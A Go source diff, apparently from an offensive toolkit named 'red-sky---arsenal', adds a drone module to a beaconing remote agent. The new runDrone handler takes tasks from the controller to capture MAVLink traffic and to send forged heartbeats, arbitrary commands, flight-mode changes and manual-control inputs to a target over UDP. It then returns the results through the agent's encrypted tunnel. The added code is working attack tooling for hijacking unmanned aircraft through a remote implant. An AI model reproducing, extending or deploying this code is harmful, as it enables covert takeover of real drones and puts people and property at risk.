@@ -34,6 +34,7 @@ import (
 	"github.com/sk666G/red-sky---arsenal/internal/crypto"
 	"github.com/sk666G/red-sky---arsenal/internal/cryptogo"
 	"github.com/sk666G/red-sky---arsenal/internal/cryptor"
+	"github.com/sk666G/red-sky---arsenal/internal/drone"
 	"github.com/sk666G/red-sky---arsenal/internal/evade"
 	"github.com/sk666G/red-sky---arsenal/internal/icsgo"
 	"github.com/sk666G/red-sky---arsenal/internal/iotcreds"
@@ -365,6 +366,12 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runBluetooth(conn, sess, b)
+		case proto.TypeDroneStart:
+			var d proto.DroneStart
+			if err := json.Unmarshal(env.Payload, &d); err != nil {
+				continue
+			}
+			go runDrone(conn, sess, d)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -2412,4 +2419,118 @@ func runBluetooth(conn net.Conn, sess *crypto.Session, b proto.BluetoothStart) {
 		return
 	}
 	send(proto.BluetoothData{Done: true})
+}
+
+// runDrone drives MAVLink operations on the agent.
+func runDrone(conn net.Conn, sess *crypto.Session, d proto.DroneStart) {
+	send := func(pd proto.DroneData) {
+		pd.SessionID = d.SessionID
+		sendTunnelAck(conn, sess, proto.TypeDroneData, pd)
+	}
+
+	opts := drone.MAVLinkOptions{
+		Host:   d.Host,
+		Port:   d.Port,
+		SysID:  d.SysID,
+		CompID: d.CompID,
+	}
+	seq := uint8(time.Now().UnixNano() & 0xFF)
+
+	switch d.Action {
+	case "listen":
+		dur := time.Duration(d.ListenDuration) * time.Second
+		frames, err := drone.Listen(d.Port, dur)
+		if err != nil {
+			send(proto.DroneData{Error: err.Error(), Done: true})
+			return
+		}
+		var lines []string
+		for _, f := range frames {
+			lines = append(lines, f.From+"|"+itoaU8(f.MsgID)+"|"+hexBytes(f.Payload))
+		}
+		send(proto.DroneData{Frames: lines})
+
+	case "heartbeat":
+		f, err := drone.Heartbeat(d.SysID, d.CompID, seq)
+		if err != nil {
+			send(proto.DroneData{Error: err.Error(), Done: true})
+			return
+		}
+		if err := drone.SendUDP(opts, f); err != nil {
+			send(proto.DroneData{Error: err.Error(), Done: true})
+			return
+		}
+		send(proto.DroneData{Message: "heartbeat sent"})
+
+	case "command":
+		var params [7]float32
+		for i := 0; i < len(d.Params) && i < 7; i++ {
+			params[i] = d.Params[i]
+		}
+		f, err := drone.CommandLong(d.SysID, d.CompID, seq, d.TargetSys, d.TargetComp, d.Command, params, 0)
+		if err != nil {
+			send(proto.DroneData{Error: err.Error(), Done: true})
+			return
+		}
+		if err := drone.SendUDP(opts, f); err != nil {
+			send(proto.DroneData{Error: err.Error(), Done: true})
+			return
+		}
+		send(proto.DroneData{Message: "command sent"})
+
+	case "mode":
+		f, err := drone.SetMode(d.SysID, d.CompID, seq, uint8(d.TargetSys), d.BaseMode, d.CustomMode)
+		if err != nil {
+			send(proto.DroneData{Error: err.Error(), Done: true})
+			return
+		}
+		if err := drone.SendUDP(opts, f); err != nil {
+			send(proto.DroneData{Error: err.Error(), Done: true})
+			return
+		}
+		send(proto.DroneData{Message: "mode set"})
+
+	case "manual":
+		f, err := drone.ManualControl(d.SysID, d.CompID, seq, uint8(d.TargetSys), d.ManualX, d.ManualY, d.ManualZ, d.ManualR, d.Buttons)
+		if err != nil {
+			send(proto.DroneData{Error: err.Error(), Done: true})
+			return
+		}
+		if err := drone.SendUDP(opts, f); err != nil {
+			send(proto.DroneData{Error: err.Error(), Done: true})
+			return
+		}
+		send(proto.DroneData{Message: "manual control sent"})
+
+	default:
+		send(proto.DroneData{Error: "unknown action: " + d.Action, Done: true})
+		return
+	}
+	send(proto.DroneData{Done: true})
+}
+
+// itoaU8 converts a uint8 to string. Small helper for the drone handler.
+func itoaU8(n uint8) string {
+	if n == 0 {
+		return "0"
+	}
+	var buf [4]byte
+	i := len(buf)
+	for n > 0 {
+		i--
+		buf[i] = byte('0' + n%10)
+		n /= 10
+	}
+	return string(buf[i:])
+}
+
+// hexBytes renders a byte slice as a hex string.
+func hexBytes(b []byte) string {
+	const hexdigits = "0123456789abcdef"
+	out := make([]byte, len(b)*2)
+	for i, x := range b {
+		out[i*2] = hexdigits[x>>4]
+		out[i*2+1] = hexdigits[x&0x0F]
+	}
+	return string(out)
 }
